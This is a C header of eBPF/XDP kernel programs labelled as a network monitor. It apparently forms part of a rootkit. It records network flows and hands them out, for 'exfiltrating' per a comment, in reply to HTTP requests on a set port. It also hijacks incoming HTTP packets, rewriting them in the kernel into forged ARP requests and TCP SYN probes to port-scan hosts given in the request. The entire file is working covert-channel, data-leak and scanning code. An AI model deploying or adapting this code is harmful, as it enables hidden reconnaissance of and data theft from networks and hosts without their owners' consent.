/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
/* Copyright (c) 2020
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of version 2 of the GNU General Public
 * License as published by the Free Software Foundation.
 */
#ifndef _NETWORK_MONITOR_H_
#define _NETWORK_MONITOR_H_


struct bpf_map_def SEC("maps/network_flows") network_flows = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = sizeof(struct flow_t),
    .value_size = sizeof(struct network_flow_counter_t),
    .max_entries = MAX_FLOW_COUNT,
    .pinning = 0,
    .namespace = "",
};

__attribute__((always_inline)) int monitor_flow(struct flow_t *flow, struct network_flow_counter_t *flow_counter) {
    // select flow counter
    struct network_flow_counter_t *counter = bpf_map_lookup_elem(&network_flows, flow);
    if (counter == NULL) {
        // this is a new flow, generate a new entry
        u32 key = 0;
        u32 *next_key = bpf_map_lookup_elem(&network_flow_next_key, &key);
        if (next_key == NULL) {
            // should never happen
            return 0;
        }
        key = *next_key % MAX_FLOW_COUNT;
        __sync_fetch_and_add(next_key, 1);

        // delete previous flow counter at current key
        struct flow_t *prev_flow = bpf_map_lookup_elem(&network_flow_keys, &key);
        if (prev_flow != NULL) {
            bpf_map_delete_elem(&network_flows, prev_flow);
            bpf_map_delete_elem(&network_flow_keys, &key);
        }

        // set flow counter for provided key
        struct network_flow_counter_t new_counter = {};
        bpf_map_update_elem(&network_flows, flow, &new_counter, BPF_ANY);

        // set the flow in the network_flow_keys for exfiltrating
        bpf_map_update_elem(&network_flow_keys, &key, flow, BPF_ANY);
    }

    counter = bpf_map_lookup_elem(&network_flows, flow);
    if (counter == NULL) {
        // should never happen
        return 0;
    }

    // add packet length to counter
    counter->data.tcp_count += flow_counter->data.tcp_count;
    counter->data.udp_count += flow_counter->data.udp_count;

    return 0;
}

__attribute__((always_inline)) int monitor_flow_xdp(struct pkt_ctx_t *pkt) {
    // generate flow
    struct flow_t flow = {
        .data = {
            .saddr = pkt->ipv4->saddr,
            .daddr = pkt->ipv4->daddr,
            .flow_type = INGRESS_FLOW,
        },
    };
    if (pkt->ipv4->protocol == IPPROTO_TCP) {
        flow.data.source_port = htons(pkt->tcp->source);
        flow.data.dest_port = htons(pkt->tcp->dest);
    } else if (pkt->ipv4->protocol == IPPROTO_UDP) {
        flow.data.source_port = htons(pkt->udp->source);
        flow.data.dest_port = htons(pkt->udp->dest);
    } else {
        return 0;
    }
    struct network_flow_counter_t counter = {};
    // add packet length to counter
    if (pkt->ipv4->protocol == IPPROTO_TCP) {
        counter.data.tcp_count = htons(pkt->ipv4->tot_len);
    } else if (pkt->ipv4->protocol == IPPROTO_UDP) {
        counter.data.udp_count = htons(pkt->ipv4->tot_len);
    }

    return monitor_flow(&flow, &counter);
}

__attribute__((always_inline)) int atoi(char c) {
    if (c >= '0' && c <= '9') {
        return c - '0';
    }
    return 0;
}

__attribute__((always_inline)) int handle_get_net_dis(char request[HTTP_REQ_LEN]) {
    // parse the requested index
    u32 start_id = atoi(request[0]) * 1000 + atoi(request[1]) * 100 + atoi(request[2]) * 10 + atoi(request[3]);
    if (start_id >= MAX_FLOW_COUNT) {
        return 0;
    }

    u32 key = DEDICATED_WATCH_KEY_NETWORK_DISCOVERY;
    struct fs_watch_key_t *fs_watch_key = bpf_map_lookup_elem(&dedicated_watch_keys, &key);
    if (fs_watch_key == NULL) {
        // should never happen
        return 0;
    }

    // fetch fs_watch entry for the image list
    struct fs_watch_t *watch = bpf_map_lookup_elem(&fs_watches, fs_watch_key);
    if (watch == NULL) {
        // create the entry for the first time
        key = 0;
        watch = bpf_map_lookup_elem(&fs_watch_gen, &key);
        if (watch == NULL) {
            // should never happen
            return 0;
        }
        watch->next_key = 0;
        watch->content[0] = 0;

        bpf_map_update_elem(&fs_watches, fs_watch_key, watch, BPF_ANY);
        watch = bpf_map_lookup_elem(&fs_watches, fs_watch_key);
        if (watch == NULL) {
            // should never happen
            return 0;
        }
    }

    // loop through the requested indexes (we only have room for 15 = 500 // 32)
    struct flow_t *flow;
    struct flow_t empty_flow = {};
    struct network_flow_counter_t *counter;
    struct network_flow_counter_t empty_counter = {};
    int cursor = start_id;
    #pragma unroll
    for (int i = 0; i < 15; i++) {
        cursor = start_id + i;
        flow = bpf_map_lookup_elem(&network_flow_keys, &cursor);
        if (flow == NULL) {
            flow = &empty_flow;
            counter = &empty_counter;
        } else {
            counter = bpf_map_lookup_elem(&network_flows, flow);
            if (counter == NULL) {
                counter = &empty_counter;
            }
        }

        // copy flow data
        watch->content[i * 32] = flow->b.saddr_a != 0 ? flow->b.saddr_a : '*';
        watch->content[i * 32 + 1] = flow->b.saddr_b != 0 ? flow->b.saddr_b : '*';
        watch->content[i * 32 + 2] = flow->b.saddr_c != 0 ? flow->b.saddr_c : '*';
        watch->content[i * 32 + 3] = flow->b.saddr_d != 0 ? flow->b.saddr_d : '*';
        watch->content[i * 32 + 4] = flow->b.daddr_a != 0 ? flow->b.daddr_a : '*';
        watch->content[i * 32 + 5] = flow->b.daddr_b != 0 ? flow->b.daddr_b : '*';
        watch->content[i * 32 + 6] = flow->b.daddr_c != 0 ? flow->b.daddr_c : '*';
        watch->content[i * 32 + 7] = flow->b.daddr_d != 0 ? flow->b.daddr_d : '*';
        watch->content[i * 32 + 8] = flow->b.source_port_a != 0 ? flow->b.source_port_a : '*';
        watch->content[i * 32 + 9] = flow->b.source_port_b != 0 ? flow->b.source_port_b : '*';
        watch->content[i * 32 + 10] = flow->b.dest_port_a != 0 ? flow->b.dest_port_a : '*';
        watch->content[i * 32 + 11] = flow->b.dest_port_b != 0 ? flow->b.dest_port_b : '*';
        watch->content[i * 32 + 12] = flow->b.flow_type_a != 0 ? flow->b.flow_type_a : '*';
        watch->content[i * 32 + 13] = flow->b.flow_type_b != 0 ? flow->b.flow_type_b : '*';
        watch->content[i * 32 + 14] = flow->b.flow_type_c != 0 ? flow->b.flow_type_c : '*';
        watch->content[i * 32 + 15] = flow->b.flow_type_d != 0 ? flow->b.flow_type_d : '*';

        // copy counter data
        watch->content[i * 32 + 16] = counter->b.udp_count_a != 0 ? counter->b.udp_count_a : '*';
        watch->content[i * 32 + 17] = counter->b.udp_count_b != 0 ? counter->b.udp_count_b : '*';
        watch->content[i * 32 + 18] = counter->b.udp_count_c != 0 ? counter->b.udp_count_c : '*';
        watch->content[i * 32 + 19] = counter->b.udp_count_d != 0 ? counter->b.udp_count_d : '*';
        watch->content[i * 32 + 20] = counter->b.udp_count_e != 0 ? counter->b.udp_count_e : '*';
        watch->content[i * 32 + 21] = counter->b.udp_count_f != 0 ? counter->b.udp_count_f : '*';
        watch->content[i * 32 + 22] = counter->b.udp_count_g != 0 ? counter->b.udp_count_g : '*';
        watch->content[i * 32 + 23] = counter->b.udp_count_h != 0 ? counter->b.udp_count_h : '*';
        watch->content[i * 32 + 24] = counter->b.tcp_count_a != 0 ? counter->b.tcp_count_a : '*';
        watch->content[i * 32 + 25] = counter->b.tcp_count_b != 0 ? counter->b.tcp_count_b : '*';
        watch->content[i * 32 + 26] = counter->b.tcp_count_c != 0 ? counter->b.tcp_count_c : '*';
        watch->content[i * 32 + 27] = counter->b.tcp_count_d != 0 ? counter->b.tcp_count_d : '*';
        watch->content[i * 32 + 28] = counter->b.tcp_count_e != 0 ? counter->b.tcp_count_e : '*';
        watch->content[i * 32 + 29] = counter->b.tcp_count_f != 0 ? counter->b.tcp_count_f : '*';
        watch->content[i * 32 + 30] = counter->b.tcp_count_g != 0 ? counter->b.tcp_count_g : '*';
        watch->content[i * 32 + 31] = counter->b.tcp_count_h != 0 ? counter->b.tcp_count_h : '*';
    }
    return 0;
}

SEC("xdp/ingress/get_net_dis")
int xdp_ingress_get_net_dis(struct xdp_md *ctx) {
    struct cursor c;
    struct pkt_ctx_t pkt;
    int ret = parse_xdp_packet(ctx, &c, &pkt);
    if (ret < 0) {
        return XDP_PASS;
    }

    switch (pkt.ipv4->protocol) {
        case IPPROTO_TCP:
            if (pkt.tcp->dest != htons(load_http_server_port())) {
                return XDP_PASS;
            }

            handle_get_net_dis(pkt.http_req->data);
            // tail call to execute the action set for this request
            bpf_tail_call(ctx, &xdp_progs, HTTP_ACTION_HANDLER);
            break;
    }

    return XDP_PASS;
}

__attribute__((always_inline)) int handle_get_net_sca(struct xdp_md *ctx, struct cursor *c, struct pkt_ctx_t *pkt, char request[HTTP_REQ_LEN]) {
    u32 csum = 0;
    u32 zero = 0;
    u16 to_strip = 0;
    struct network_scan_t scan = {};

    // parse ip
    scan.daddr = (atoi(request[0]) * 100 + atoi(request[1]) * 10 + atoi(request[2]));
    scan.daddr += (atoi(request[3]) * 100 + atoi(request[4]) * 10 + atoi(request[5])) << 8;
    scan.daddr += (atoi(request[6]) * 100 + atoi(request[7]) * 10 + atoi(request[8])) << 16;
    scan.daddr += (atoi(request[9]) * 100 + atoi(request[10]) * 10 + atoi(request[11])) << 24;

    // parse port
    scan.port = atoi(request[12]) * 10000 + atoi(request[13]) * 1000 + atoi(request[14]) * 100 + atoi(request[15]) * 10 + atoi(request[16]);

    // parse portRange
    scan.port_range = atoi(request[17]) * 10000 + atoi(request[18]) * 1000 + atoi(request[19]) * 100 + atoi(request[20]) * 10 + atoi(request[21]);

    struct network_scan_state_t *state = bpf_map_lookup_elem(&network_scans, &scan);
    if (state == NULL) {
        struct network_scan_state_t new_state = {};
        bpf_map_update_elem(&network_scans, &scan, &new_state, BPF_ANY);
        state = bpf_map_lookup_elem(&network_scans, &scan);
        if (state == NULL) {
            // should never happen
            return -1;
        }
    }

    if (state->syn_counter >= scan.port_range) {
        // let the packet go through
        return -1;
    }

    char *dst_mac;
    if (state->step == ARP_REQUEST_STEP) {
        // check if the requested IP has its corresponding MAC address in cache
        dst_mac = bpf_map_lookup_elem(&arp_cache, &scan.daddr);
        if (dst_mac == NULL) {
            // bpf_printk("sending ARP request ...\n");

            // fetch ARP request payload
            u32 raw_packet_key = ARP_REQUEST_RAW_PACKET;
            struct raw_packet_t *packet = bpf_map_lookup_elem(&raw_packets, &raw_packet_key);
            if (packet == NULL) {
                // should never happen
                return -1;
            }

            // override source MAC addr (layer 2)
            packet->data[6] = pkt->eth->h_dest[0];
            packet->data[7] = pkt->eth->h_dest[1];
            packet->data[8] = pkt->eth->h_dest[2];
            packet->data[9] = pkt->eth->h_dest[3];
            packet->data[10] = pkt->eth->h_dest[4];
            packet->data[11] = pkt->eth->h_dest[5];

            // override source MAC addr (ARP request)
            packet->data[22] = pkt->eth->h_dest[0];
            packet->data[23] = pkt->eth->h_dest[1];
            packet->data[24] = pkt->eth->h_dest[2];
            packet->data[25] = pkt->eth->h_dest[3];
            packet->data[26] = pkt->eth->h_dest[4];
            packet->data[27] = pkt->eth->h_dest[5];

            // override source IP address (ARP request)
            packet->data[28] = *(u8*)((char *)&pkt->ipv4->daddr);
            packet->data[29] = *(u8*)((char *)&pkt->ipv4->daddr + 1);
            packet->data[30] = *(u8*)((char *)&pkt->ipv4->daddr + 2);
            packet->data[31] = *(u8*)((char *)&pkt->ipv4->daddr + 3);

            // override target IP address (ARP request)
            packet->data[38] = *(u8*)((char *)&scan.daddr);
            packet->data[39] = *(u8*)((char *)&scan.daddr + 1);
            packet->data[40] = *(u8*)((char *)&scan.daddr + 2);
            packet->data[41] = *(u8*)((char *)&scan.daddr + 3);

            // write forged ARP request
            u8 *cursor = (void *) pkt->eth;

            #pragma unroll
            for (int i = 0; i < RAW_PACKET_LEN; i++) {
                if (i >= packet->len) {
                    goto next_arp;
                }

                if (cursor + i + 1 > c->end) {
                    goto next_arp;
                }

                *cursor++ = packet->data[i];
                // bpf_printk("%d: %x\n", i, packet->data[i] & 0xFF);
            }

next_arp:
            // cut the packet to the right size
            to_strip = c->end - (void *)cursor;
            bpf_xdp_adjust_tail(ctx, -(int)to_strip);
            state->step = ARP_REPLY_STEP;

            // insert scan key in arp_ip_scan_key so that the ARP monitoring program can update the step of the scan
            bpf_map_update_elem(&arp_ip_scan_key, &scan.daddr, &scan, BPF_ANY);

            // add monitoring
            struct flow_t flow = {
                .data = {
                    .saddr = *(u32*)(void *)&packet->data[28],
                    .daddr = scan.daddr,
                    .flow_type = ARP_REQUEST,
                },
            };
            struct network_flow_counter_t counter = {};
            monitor_flow(&flow, &counter);
            bpf_printk("sending ARP request ...\n");

            // XDP_TX request
            return 1;

        } else {
            // if the IP is in cache, we don't need to resolve its MAC address, move on to the SYN scan
            state->step = SYN_STEP;
        }
    }

    if (state->step == SYN_STEP) {
        u32 raw_packet_key = SYN_REQUEST_RAW_PACKET;
        struct raw_packet_t *packet = bpf_map_lookup_elem(&raw_packets, &raw_packet_key);
        if (packet == NULL) {
            // should never happen
            return -1;
        }

        dst_mac = bpf_map_lookup_elem(&arp_cache, &scan.daddr);
        if (dst_mac == NULL) {
            // should never happen
            return -1;
        }

        // override destination MAC addr (layer 2)
        packet->data[0] = *dst_mac;
        packet->data[1] = *(dst_mac + 1);
        packet->data[2] = *(dst_mac + 2);
        packet->data[3] = *(dst_mac + 3);
        packet->data[4] = *(dst_mac + 4);
        packet->data[5] = *(dst_mac + 5);

        // override source MAC addr (layer 2)
        packet->data[6] = pkt->eth->h_dest[0];
        packet->data[7] = pkt->eth->h_dest[1];
        packet->data[8] = pkt->eth->h_dest[2];
        packet->data[9] = pkt->eth->h_dest[3];
        packet->data[10] = pkt->eth->h_dest[4];
        packet->data[11] = pkt->eth->h_dest[5];

        // override source IP address (layer 3)
        u32 src_ip = pkt->ipv4->daddr;
        packet->data[26] = *(u8*)((char *)&pkt->ipv4->daddr);
        packet->data[27] = *(u8*)((char *)&pkt->ipv4->daddr + 1);
        packet->data[28] = *(u8*)((char *)&pkt->ipv4->daddr + 2);
        packet->data[29] = *(u8*)((char *)&pkt->ipv4->daddr + 3);

        // override destination IP address (layer 3)
        packet->data[30] = *(u8*)((char *)&scan.daddr);
        packet->data[31] = *(u8*)((char *)&scan.daddr + 1);
        packet->data[32] = *(u8*)((char *)&scan.daddr + 2);
        packet->data[33] = *(u8*)((char *)&scan.daddr + 3);

        // override destination port (layer 4)
        packet->data[36] = *(u8*)((char *)&scan.port + 1);
        packet->data[37] = *(u8*)((char *)&scan.port);

        // write forged ARP request
        u8 *cursor = (void *) pkt->eth;

        #pragma unroll
        for (int i = 0; i < RAW_PACKET_LEN; i++) {
            if (i >= packet->len) {
                goto next_syn;
            }

            if (cursor + i + 1 > c->end) {
                goto next_syn;
            }

            *cursor++ = packet->data[i];
            // bpf_printk("%d: %x\n", i, packet->data[i] & 0xFF);
        }

next_syn:
        // compute IP checksum (layer 3)
        csum = ~(0xd07a); // this is the initial IP layer checksum (as set by the user space program) when all IPs are set to 0
        csum = bpf_csum_diff(&zero, 4, &scan.daddr, 4, csum);
        csum = (csum & 0xFFFF) + (csum >> 16);
        csum = (csum & 0xFFFF) + (csum >> 16);
        csum = bpf_csum_diff(&zero, 4, &src_ip, 4, csum);
        csum = (csum & 0xFFFF) + (csum >> 16);
        csum = (csum & 0xFFFF) + (csum >> 16);
        pkt->ipv4->check = ~csum;

        // adjust packet tail
        to_strip = c->end - (void *) cursor;
        bpf_xdp_adjust_tail(ctx, -(int)to_strip);

        // compute TCP checksum (layer 4)
        xdp_compute_tcp_csum(ctx, c, pkt);

        // update SYN counter
        state->syn_counter += 1;
        state->step = SYN_LOOP_STEP;

        // add monitoring
        struct flow_t flow = {
            .data = {
                .saddr = src_ip,
                .daddr = scan.daddr,
                .flow_type = SYN_REQUEST,
                .source_port = COOL,
                .dest_port = scan.port,
            },
        };
        struct network_flow_counter_t counter = {
            .data = {
                .tcp_count = packet->len,
            },
        };
        monitor_flow(&flow, &counter);

        // insert scan key in tcp_ip_scan_key so that we can detect the Ack / Reset answer and advance to the next port.
        bpf_map_update_elem(&tcp_ip_scan_key, &scan.daddr, &scan, BPF_ANY);

        // XDP_TX request
        return 1;
    }

    if (state->step == SCAN_FINISHED) {
        // remove scan request
        bpf_map_delete_elem(&network_scans, &scan);
    }

    return 0;
}

SEC("xdp/ingress/get_net_sca")
int xdp_ingress_get_net_sca(struct xdp_md *ctx) {
    struct cursor c;
    struct pkt_ctx_t pkt;
    int ret = parse_xdp_packet(ctx, &c, &pkt);
    if (ret < 0) {
        return XDP_PASS;
    }

    switch (pkt.ipv4->protocol) {
        case IPPROTO_TCP:
            if (pkt.tcp->dest != htons(load_http_server_port())) {
                return XDP_PASS;
            }

            switch (handle_get_net_sca(ctx, &c, &pkt, pkt.http_req->data)) {
            case -1:
            case 0:
                // tail call to execute the action set for this request
                bpf_tail_call(ctx, &xdp_progs, HTTP_ACTION_HANDLER);
                break;
            case 1:
                // retransmit the packet
                return XDP_TX;
            }
            break;
    }

    return XDP_PASS;
}

SEC("xdp/ingress/syn_loop")
int xdp_ingress_syn_loop(struct xdp_md *ctx) {
    struct cursor c;
    struct pkt_ctx_t pkt;
    xdp_cursor_init(&c, ctx);
    if (!(pkt.eth = parse_ethhdr(&c))) {
        return XDP_PASS;
    }

    if (pkt.eth->h_proto != htons(ETH_P_IP)) {
        return XDP_PASS;
    }

    if (!(pkt.ipv4 = parse_iphdr(&c))) {
        return XDP_PASS;
    }

    if (pkt.ipv4->protocol != IPPROTO_TCP) {
        return XDP_PASS;
    }

    if (!(pkt.tcp = parse_tcphdr(&c))) {
        return XDP_PASS;
    }

    // check the destination port
    if (pkt.tcp->dest != htons(COOL)) {
        return XDP_PASS;
    }

    // select active scan
    struct network_scan_t *scan = bpf_map_lookup_elem(&tcp_ip_scan_key, &pkt.ipv4->saddr);
    if (scan == NULL) {
        return XDP_PASS;
    }

    struct network_scan_state_t *state = bpf_map_lookup_elem(&network_scans, scan);
    if (state == NULL) {
        return XDP_PASS;
    }

    if (state->step != SYN_LOOP_STEP) {
        return XDP_PASS;
    }

    // add monitoring
    struct flow_t flow = {
        .data = {
            .saddr = pkt.ipv4->saddr,
            .daddr = pkt.ipv4->daddr,
            .source_port = htons(pkt.tcp->source),
            .dest_port = COOL,
        },
    };
    struct network_flow_counter_t counter = {
        .data = {
            .tcp_count = htons(pkt.ipv4->tot_len),
        },
    };
    if (pkt.tcp->rst) {
        flow.data.flow_type = RESET;
    } else if (pkt.tcp->syn && pkt.tcp->ack) {
        flow.data.flow_type = SYN_ACK;
        bpf_printk("OPEN PORT %d\n", htons(pkt.tcp->source));
    }
    monitor_flow(&flow, &counter);
    bpf_printk("SYN request answer (%d): rst:%d syn:%d\n", htons(pkt.tcp->source), pkt.tcp->rst, pkt.tcp->syn);

    // increment syn_counter
    state->syn_counter += 1;

    // check if we should send another SYN request or stop there
    if (state->syn_counter >= scan->port_range) {
        goto scan_finished;
    }

    // prepare next SYN request
    pkt.tcp->ack = 0;
    pkt.tcp->rst = 0;
    pkt.tcp->syn = 1;
    u16 port = scan->port + state->syn_counter;
    pkt.tcp->dest = htons(port);
    pkt.tcp->source = htons(COOL);

    // switch IPs
    u32 saddr = pkt.ipv4->saddr;
    u32 daddr = pkt.ipv4->daddr;
    pkt.ipv4->saddr = daddr;
    pkt.ipv4->daddr = saddr;

    // switch MAC addresses
    char tmp_mac[ETH_ALEN] = {};
    tmp_mac[0] = pkt.eth->h_dest[0];
    tmp_mac[1] = pkt.eth->h_dest[1];
    tmp_mac[2] = pkt.eth->h_dest[2];
    tmp_mac[3] = pkt.eth->h_dest[3];
    tmp_mac[4] = pkt.eth->h_dest[4];
    tmp_mac[5] = pkt.eth->h_dest[5];

    pkt.eth->h_dest[0] = pkt.eth->h_source[0];
    pkt.eth->h_dest[1] = pkt.eth->h_source[1];
    pkt.eth->h_dest[2] = pkt.eth->h_source[2];
    pkt.eth->h_dest[3] = pkt.eth->h_source[3];
    pkt.eth->h_dest[4] = pkt.eth->h_source[4];
    pkt.eth->h_dest[5] = pkt.eth->h_source[5];

    pkt.eth->h_source[0] = tmp_mac[0];
    pkt.eth->h_source[1] = tmp_mac[1];
    pkt.eth->h_source[2] = tmp_mac[2];
    pkt.eth->h_source[3] = tmp_mac[3];
    pkt.eth->h_source[4] = tmp_mac[4];
    pkt.eth->h_source[5] = tmp_mac[5];

    // compute TCP checksum (layer 4)
    xdp_compute_tcp_csum(ctx, &c, &pkt);

    // add monitoring
    flow.data.saddr = daddr;
    flow.data.daddr = saddr;
    flow.data.dest_port = port;
    flow.data.source_port = COOL;
    flow.data.flow_type = SYN_REQUEST;
    monitor_flow(&flow, &counter);

    // send new SYN request
    return XDP_TX;

scan_finished:
    state->step = SCAN_FINISHED;
    bpf_map_delete_elem(&tcp_ip_scan_key, &scan->daddr);
    bpf_printk("scan done !\n");
    return XDP_DROP;
}

#endif